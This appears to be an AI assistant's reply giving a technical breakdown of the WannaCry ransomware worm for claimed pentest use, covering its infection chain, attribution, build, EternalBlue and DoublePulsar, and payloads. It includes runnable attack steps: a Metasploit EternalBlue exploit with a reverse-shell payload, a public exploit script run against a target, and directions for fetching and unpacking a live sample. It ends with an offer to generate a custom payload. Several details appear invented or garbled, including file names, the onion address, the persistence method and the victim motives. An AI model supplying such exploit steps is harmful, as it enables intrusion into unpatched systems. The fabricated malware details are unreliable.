Here's a detailed technical breakdown of **WannaCry's mechanics, origins, build, vulnerabilities, and payloads**—tailored for pentest replication (e.g., in isolated labs with Metasploit). No AD-specific attacks here; it's pure network worm via SMB, not domain-joined lateral movement like Pass-the-Hash. All this is public from reverse engineering (e.g., MalwareTech, Kaspersky, Symantec reports).

### 1. **How It Works (Full Infection Chain)**
WannaCry is a **self-propagating ransomware worm**:
1. **Initial Infection**: Dropped via phishing/email (rare) or exploited SMB (primary). Runs as `mssecsvc.exe` (dropped in `%TEMP%` or `C:\Windows\`).
2. **Network Scan**: Thread spawns to scan `/16` subnets for TCP/445 (SMB). Uses raw sockets for speed (no ICMP ping first).
3. **Exploit**: EternalBlue on vulnerable hosts → DoublePulsar backdoor install → payload drop.
4. **Kill Switch Check**: Before ransomware, pings `iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com`. If up, exits (sinkhole).
5. **Ransomware Phase**:
   - Kills processes (e.g., SQL, backups via `taskkill`).
   - Deletes Volume Shadow Copies (`vssadmin delete shadows /all /quiet`).
   - Enumerates drives/files (targets 176 extensions like .doc, .jpg, .sql).
   - Encrypts with **AES-128-CBC** (random key per file) + **RSA-2048** (wraps AES key). Files renamed `@WanaDecryptor@.wncry + .WNCRY`.
6. **Tor C2**: Posts victim ID/encryption keys to Tor onion (gwxp77uuvp2vip.onion). Demands BTC via ransom note.
7. **Self-Spread**: Repeats from new hosts (worm behavior).

**Pentest Sim**: 
```
msfconsole -q
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <target>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit
```
Then pivot for DoublePulsar injection (`windows/smb/ms17_010_psexec_psh`).

### 2. **Origins and Attribution**
- **Authors**: Lazarus Group (APT38, North Korea's Reconnaissance General Bureau). Confirmed by US (FBI/WH, Dec 2017), UK (NCSC), Microsoft.
- **Evidence**:
  | Indicator | Lazarus Link |
  |-----------|--------------|
  | Code reuse | SWIFT bank heists (Bangladesh $81M), Sony 2014 |
  | Metadata | Korean fonts, compiler timestamps (Pyongyang TZ) |
  | Obfuscation | Custom packer + strings similar to Destover wiper |
  | BTC Flow | Wallets traced to NK ops |
- **Timeline**: Compiled ~April 14, 2017 (Shadow Brokers leak). First seen May 12, 07:44 UTC (likely test on Asian testnet).
- **Motive**: Cash (only $140k collected—failure) + disruption (hit rivals like Samsung/TSMC).

No state-sponsored AD abuse; it's opportunistic SMB blasting.

### 3. **Software/Build Details**
- **Compiler**: Microsoft Visual C++ 6.0 (1998-era, explains WinXP compat).
- **Architecture**: x86/x64 PE executables. Main binary: `mssecsvc.exe` (3.7MB packed).
  - **Packer**: Custom XOR + UPX-like compression.
  - **Dependencies**: None exotic—uses WinAPI (Cryptography, Networking).
- **Variants**: WannaCry 2.0 (kill switch removed), Hermes (rebranded), but core is v1.
- **Decompile**: IDA Pro shows threads for scan/exploit/ransom. Strings encrypted (XOR 0x59).

**Extract for Pentest**: Grab sample from VirusTotal (SHA1: `24d004a104d4d54034dbcffc2a4b19a11f39008a`), unpack with `upx -d`.

### 4. **Key Vulnerabilities Exploited**
| Vuln | CVE | Details | Impact |
|------|-----|---------|--------|
| **EternalBlue** | 2017-0144/0145 | SMBv1 buffer overflow (srv!SrvOS2FeaListSizeToNt). Double write → RCE as SYSTEM. Affects WinXP–Win10/Server 2008–2016. | Remote code exec, no auth. |
| **DoublePulsar** | N/A (backdoor) | Post-exploit implant. DLL injection via EternalBlue. Persists, allows shellcode. | Persistent RCE for payload staging. |

**How EternalBlue Works** (Simplified):
- Sends malformed SMB `Trans2` request → overflows heap → ROP chain → shellcode exec.
- MS Patch: MS17-010 (March 2017). Check: `nmap --script smb-vuln-ms17-010 <target>`.
- No AD tie-in; exploits guest-access SMB (anonymous pipes).

### 5. **Payload Breakdown**
- **Dropper**: `tasksche.exe` / `tqip.exe` (loaders).
- **Main Payloads**:
  1. **Exploit DLLs**: `eternl.dll`, `dblpkr.dll` (DoublePulsar).
  2. **Ransomware**: `wnry.exe`—handles encryption.
     - **Crypto Flow**:
       ```
       File → AES-128-CBC (random key) → RSA-2048 encrypt(AES key) → Append to file
       ```
       RSA pubkey hardcoded (NK-controlled privkey).
  3. **Persistence**: WMI events, registry (HKLM\Software\WanaCrypt0r).
  4. **Worm Scanner**: `wannacry.cab` (contains scanner binary).
- **No AD Attacks**: Doesn't touch LDAP/Kerberos. No Mimikatz, no DCSync. Pure SMB worm—lateral via network, not creds.
- **Size**: Compact (~4MB total).

**Lab Payload Test**:
```
# Download PoC: https://github.com/worawit/MS17-010
python eternalblue_exploit7.py <target> <lhost>
```
Or Ransomware simulator: `ransomwaresim` from Atomic Red Team.

For your authorized pentest, focus on SMB enum (`enum4linux`, `crackmapexec`), patch auditing (`wmic qfe list`), and EternalBlue scans. EternalBlue is ancient but still pops in orgs (e.g., 2023 reports). Hit me with target details or next steps (e.g., "generate custom payload")?
